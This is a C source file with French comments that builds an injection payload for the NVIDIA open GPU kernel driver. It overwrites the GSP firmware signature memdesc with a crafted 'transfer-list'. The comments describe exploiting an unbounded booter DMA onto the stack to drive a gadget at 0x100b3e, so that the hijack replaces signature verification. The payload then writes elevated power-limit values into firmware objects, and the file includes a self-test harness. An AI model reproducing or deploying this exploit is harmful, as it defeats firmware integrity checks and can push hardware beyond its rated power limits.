/*
 * transfer_list_memdesc.c — 4.42 TÂCHE 3 : l'injection de la
 * transfer-list dans le memdesc signature du driver (kernel_gsp.c).
 *
 * Le point d'injection RÉEL (open-gpu-kernel-modules 610.57.04,
 * src/nvidia/src/kernel/gpu/gsp/kernel_gsp.c:5666-5713, cité ce pass) :
 *
 *   static NV_STATUS _kgspCreateSignatureMemdesc(OBJGPU*, KernelGsp*, GSP_FIRMWARE*)
 *   {
 *       memdescCreate(&pKernelGsp->pSignatureMemdesc, pGpu,
 *           NV_ALIGN_UP(pGspFw->signatureSize, 256), 256,
 *           NV_TRUE, ADDR_SYSMEM, NV_MEMORY_CACHED, flags);
 *       ...
 *       pSignatureVa = memdescMapInternal(pGpu, pKernelGsp->pSignatureMemdesc, ...);
 *       portMemCopy(pSignatureVa, memdescGetSize(...),
 *           pGspFw->pSignatureData, pGspFw->signatureSize);   <-- LA SOURCE
 *       memdescUnmapInternal(...);
 *   }
 *
 * Le patch remplace la SOURCE du portMemCopy (ou réécrit pSignatureVa
 * après) par NOTRE transfer-list : les octets du memdesc = ce que le
 * booter DMA sur sa pile (le DMA non borné, PROUVÉ en silicium, 7+
 * runs STATE.md) = la source de la marche du gadget 0x100b3e.
 *
 * La TAILLE PROUVÉE : .fwsignature_ga10x = 0x1000 (4096 B) dans NOTRE
 * gsp_ga10x.bin (mesuré ce pass) -> signatureSize = 0x1000 ->
 * NV_ALIGN_UP(0x1000,256) = 0x1000. Le memdesc = 4096 B = 512 slots u64.
 *
 * Le LAYOUT (le même que lab/jalon411/v442e_transfer_list_build.py) :
 *   [0x000..0x487] 0xFF (le remplissage stock)
 *   [0x488] slot0      u64  (le champ +0x488 du ctx que lit la boucle)
 *   [0x490] capacité   u64  (+0x490)
 *   [0x498] dest base  u64  (+0x498)
 *   [0x4A0] magic byte u8=8 (le setup écrit 0x8, li a2,0x8 @0x1022c8)
 *   [0x500] la LISTE : les entrées u64 PLATES (le pas = +8, PROUVÉ :
 *           addi a6,a5,0x8 @0x100b40 — PAS de {valeur,next} 16 B)
 *
 * Le contrat runtime (le plan registres du gadget, mode GADGET entrée
 * 0x100b3e) :
 *   a4 = l'adresse RUNTIME du payload (le ctx fabriqué à +0x488..)
 *   a1 = la PREMIÈRE cible (absolue, registre)
 *   a3 = N (la borne d'itérations), a7 = 0, a0 = ~0 (le chemin RAW)
 *   sp+8 = &list[0] (la cellule de marche)
 *
 * Le test unitaire : gcc -DTL_SELFTEST -o tl_test transfer_list_memdesc.c
 * puis ./tl_test dump.bin — et lab/jalon411/v442f_c_payload_test.py
 * compare byte-exact vs le builder python.
 */
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>

#define TL_MEMDESC_SIZE   0x1000u   /* 4096 B — PROUVÉ (.fwsignature_ga10x) */
#define TL_CTX_SLOT0_OFF  0x488u    /* le champ slot du ctx (+0x488) */
#define TL_CTX_CAP_OFF    0x490u    /* la capacité (+0x490) */
#define TL_CTX_DEST_OFF   0x498u    /* la dest base (+0x498) */
#define TL_CTX_MAGIC_OFF  0x4A0u    /* le magic byte (+0x4A0) = 8 */
#define TL_LIST_OFF       0x500u    /* la tête de liste */
#define TL_MAGIC_BYTE     0x08u

/* ---- 4.44 ---- le layout v444 (lab/jalon411/v444_transfer_list_build.py)
 * la liste D (8 entrées) @0x500, la liste f18 (4 entrées) @0x540. */
#define TL444_D_LIST_OFF      0x500u
#define TL444_D_LIST_COUNT    8u
#define TL444_F18_LIST_OFF    0x540u
#define TL444_F18_LIST_COUNT  4u

typedef struct {
    uint64_t slot0;       /* le slot de départ du ring fabriqué */
    uint64_t capacity;    /* la capacité (slots u64) — le wrap à 1 */
    uint64_t dest;        /* la base de destination (absolue runtime) */
    const uint64_t *list; /* les entrées (PLATES, le pas +8) */
    uint32_t count;       /* N — doit être <= (TL_MEMDESC_SIZE-TL_LIST_OFF)/8 */
} tl_config;

static void
tl_store_u64(uint8_t *p, uint64_t v)
{
    /* le GSP = little-endian RV64 ; le memdesc = lu tel quel par le DMA */
    p[0] = (uint8_t)(v);         p[1] = (uint8_t)(v >> 8);
    p[2] = (uint8_t)(v >> 16);   p[3] = (uint8_t)(v >> 24);
    p[4] = (uint8_t)(v >> 32);   p[5] = (uint8_t)(v >> 40);
    p[6] = (uint8_t)(v >> 48);   p[7] = (uint8_t)(v >> 56);
}

/*
 * Construit le payload 4096 B : le contenu NOUVEAU du memdesc signature.
 * Le remplissage = 0xFF (le pattern stock de la signature) partout hors
 * ctx/liste — le scénario "au lieu des 0xFF actuels" du brief.
 */
void
tl_build_payload(uint8_t *img /* [TL_MEMDESC_SIZE] */, const tl_config *cfg)
{
    uint32_t i;
    memset(img, 0xFF, TL_MEMDESC_SIZE);
    tl_store_u64(img + TL_CTX_SLOT0_OFF, cfg->slot0);
    tl_store_u64(img + TL_CTX_CAP_OFF,   cfg->capacity);
    tl_store_u64(img + TL_CTX_DEST_OFF,  cfg->dest);
    img[TL_CTX_MAGIC_OFF] = TL_MAGIC_BYTE;
    for (i = 0; i < cfg->count; i++) {
        tl_store_u64(img + TL_LIST_OFF + 8u * i, cfg->list[i]);
    }
}

/*
 * Le point d'injection — la forme du patch driver : appelée JUSTE APRÈS
 * le portMemCopy de _kgspCreateSignatureMemdesc (pSignatureVa encore
 * mappé), elle remplace le contenu du memdesc par la transfer-list.
 * La taille copiée = min(signatureSize, TL_MEMDESC_SIZE) — la signature
 * réelle est ÉCRASÉE (le consommateur = le booter, le LS-verify lit ce
 * que le DMA dépose : le hijack remplace la vérification).
 */
void
tl_patch_signature_memdesc(uint8_t *pSignatureVa /* memdesc mappé */)
{
    /* la config = la table E1/E2 de v442e (les valeurs, pas inventées) :
     * E1 : {limitRated 240000 conservé, limitMax 280000} =
     *      0x000445C00003A980 (mW u32 LE, PROUVÉ transport) */
    static const uint64_t list[] = {
        0x000445C00003A980ull,  /* E1 -> [a1] = params+0x108 (résolu runtime) */
        0x000445C00003A980ull,  /* le scatter slot1 */
        0x000445C00003A980ull,  /* le scatter slot2 */
    };
    static const tl_config cfg = {
        .slot0    = 0,
        .capacity = 0x400,               /* 1024 slots (>= N, pas de wrap) */
        .dest     = 0ull,                /* REMPLI AU RUNTIME (la base résolue) */
        .list     = list,
        .count    = 3,
    };
    uint8_t img[TL_MEMDESC_SIZE];
    tl_build_payload(img, &cfg);
    memcpy(pSignatureVa, img, TL_MEMDESC_SIZE);
}

/*
 * ---- 4.44 ---- le builder v444 : le payload de la chaîne d'écriture
 * vers l'objet 0x6d0. La liste D = le scatter du tableau des bases
 * (les D u64 à obj+0x618+idx*0x10, les slots {1,3,5,7} relatifs à
 * dest = obj+0x610 — UNE invocation a3=8). La liste f18 = les 4
 * records persistants (obj+0x18+idx*0x30, espacés 0x30 = 4 invocations
 * a3=1 — le a1-refresh n'existe pas dans le booter, v444e).
 *
 * dest = le PARAMÈTRE RUNTIME (obj+0x610, l'adresse heap de l'objet
 * résolue le jour capture) — le placeholder 0 = refusé au boot par le
 * runbook (le garde dest==0 -> la boucle inerte, PROUVÉ TT-D).
 *
 * reading_percent != 0 -> la lecture percent (D=280000000 µW,
 * f18=112) ; == 0 -> la lecture permille (D=28000000, f18=1120).
 * L'unité = INDECIDABLE-BY-BYTES (v444d) — l'expérience U2 décide.
 */
void
tl_build_payload_444(uint8_t *img /* [TL_MEMDESC_SIZE] */,
                     uint64_t dest, uint64_t slot0, uint64_t capacity,
                     int reading_percent)
{
    uint64_t dval, fval;
    uint64_t dlist[TL444_D_LIST_COUNT];
    uint64_t flist[TL444_F18_LIST_COUNT];
    uint32_t i;

    if (reading_percent) {
        dval = 280000000ull;   /* 280 W en µW — v444d percent */
        fval = 112ull;         /* 100 x 28/25 — le pourcentage */
    } else {
        dval = 28000000ull;    /* la lecture permille (v444d) */
        fval = 1120ull;
    }
    /* le scatter D : les slots {0,1,2,3,4,5,6,7} =
     * [D0, D0, P, D1, P, D2, P, D3] — D aux slots impairs de dest+8,
     * P = 0 aux {B,C} (le clobber nommé, auto-réparé par la recompute) */
    dlist[0] = dval;  dlist[1] = dval;
    dlist[2] = 0;     dlist[3] = dval;
    dlist[4] = 0;     dlist[5] = dval;
    dlist[6] = 0;     dlist[7] = dval;
    for (i = 0; i < TL444_F18_LIST_COUNT; i++)
        flist[i] = fval;

    memset(img, 0xFF, TL_MEMDESC_SIZE);
    tl_store_u64(img + TL_CTX_SLOT0_OFF, slot0);
    tl_store_u64(img + TL_CTX_CAP_OFF,   capacity);
    tl_store_u64(img + TL_CTX_DEST_OFF,  dest);
    img[TL_CTX_MAGIC_OFF] = TL_MAGIC_BYTE;
    for (i = 0; i < TL444_D_LIST_COUNT; i++)
        tl_store_u64(img + TL444_D_LIST_OFF + 8u * i, dlist[i]);
    for (i = 0; i < TL444_F18_LIST_COUNT; i++)
        tl_store_u64(img + TL444_F18_LIST_OFF + 8u * i, flist[i]);
}

#ifdef TL_SELFTEST
/* le test unitaire C : les invariants de layout + le dump optionnel.
 * 4.44 : TL444 = les invariants du builder v444 (le 5e groupe). */
int
main(int argc, char **argv)
{
    uint8_t img[TL_MEMDESC_SIZE];
    static const uint64_t list[3] = {
        0x000445C00003A980ull, 0x000445C00003A980ull, 0x000445C00003A980ull
    };
    tl_config cfg = { 0, 0x400, 0, list, 3 };
    int fails = 0;
    size_t i;

    tl_build_payload(img, &cfg);

    /* T1 : le remplissage 0xFF hors ctx/liste */
    for (i = 0; i < TL_CTX_SLOT0_OFF; i++)
        if (img[i] != 0xFF) { fails++; break; }
    /* T2 : les champs ctx */
    if (img[TL_CTX_SLOT0_OFF] != 0) fails++;
    if (img[TL_CTX_CAP_OFF]   != 0x00 || img[TL_CTX_CAP_OFF+1] != 0x04) fails++;
    if (img[TL_CTX_MAGIC_OFF] != TL_MAGIC_BYTE) fails++;
    /* T3 : la tête de liste = E1 little-endian */
    if (img[TL_LIST_OFF]   != 0x80 || img[TL_LIST_OFF+1] != 0xA9 ||
        img[TL_LIST_OFF+2] != 0x03 || img[TL_LIST_OFF+3] != 0x00 ||
        img[TL_LIST_OFF+4] != 0xC0 || img[TL_LIST_OFF+5] != 0x45 ||
        img[TL_LIST_OFF+6] != 0x04 || img[TL_LIST_OFF+7] != 0x00) fails++;
    /* T4 : entre la fin de liste et la fin = 0xFF */
    for (i = TL_LIST_OFF + 8 * 3; i < TL_MEMDESC_SIZE; i++)
        if (img[i] != 0xFF) { fails++; break; }

    printf("tl_c_selftest: %s (%d groups failed of 4)\n", fails ? "FAIL" : "PASS", fails);
    if (argc > 1) {
        FILE *f = fopen(argv[1], "wb");
        if (f) { fwrite(img, 1, TL_MEMDESC_SIZE, f); fclose(f); }
    }

    /* ---- 4.44 : le 5e groupe = les invariants v444 (le dump argv[2]) */
    if (argc > 2) {
        int f444 = 0;
        uint8_t img444[TL_MEMDESC_SIZE];
        tl_build_payload_444(img444, 0x12345678ull, 0, 0x400, 1);
        /* TL444-T1 : le ctx */
        if (img444[TL_CTX_SLOT0_OFF] != 0) f444++;
        if (img444[TL_CTX_DEST_OFF]   != 0x78 ||
            img444[TL_CTX_DEST_OFF+1] != 0x56 ||
            img444[TL_CTX_DEST_OFF+2] != 0x34 ||
            img444[TL_CTX_DEST_OFF+3] != 0x12) f444++;
        if (img444[TL_CTX_MAGIC_OFF] != TL_MAGIC_BYTE) f444++;
        /* TL444-T2 : la liste D = [D,D,0,D,0,D,0,D], D = 0x10B07600 */
        {
            static const uint64_t want[8] = {
                0x10B07600ull, 0x10B07600ull, 0, 0x10B07600ull,
                0, 0x10B07600ull, 0, 0x10B07600ull
            };
            for (i = 0; i < 8; i++) {
                uint64_t got = 0;
                unsigned k;
                for (k = 0; k < 8; k++)
                    got |= (uint64_t)img444[TL444_D_LIST_OFF + 8*i + k] << (8*k);
                if (got != want[i]) f444++;
            }
        }
        /* TL444-T3 : la liste f18 = 4 x 0x70 */
        for (i = 0; i < 4; i++) {
            uint64_t got = 0;
            unsigned k;
            for (k = 0; k < 8; k++)
                got |= (uint64_t)img444[TL444_F18_LIST_OFF + 8*i + k] << (8*k);
            if (got != 0x70ull) f444++;
        }
        /* TL444-T4 : hors ctx/listes = 0xFF (entre 0x560 et la fin) */
        for (i = TL444_F18_LIST_OFF + 8 * TL444_F18_LIST_COUNT;
             i < TL_MEMDESC_SIZE; i++)
            if (img444[i] != 0xFF) { f444++; break; }
        printf("tl444_c_selftest: %s (%d checks failed of 4)\n",
               f444 ? "FAIL" : "PASS", f444);
        fails += f444;
        if (argc > 2) {
            FILE *f2 = fopen(argv[2], "wb");
            if (f2) { fwrite(img444, 1, TL_MEMDESC_SIZE, f2); fclose(f2); }
        }
    }
    return fails ? 1 : 0;
}
#endif /* TL_SELFTEST */
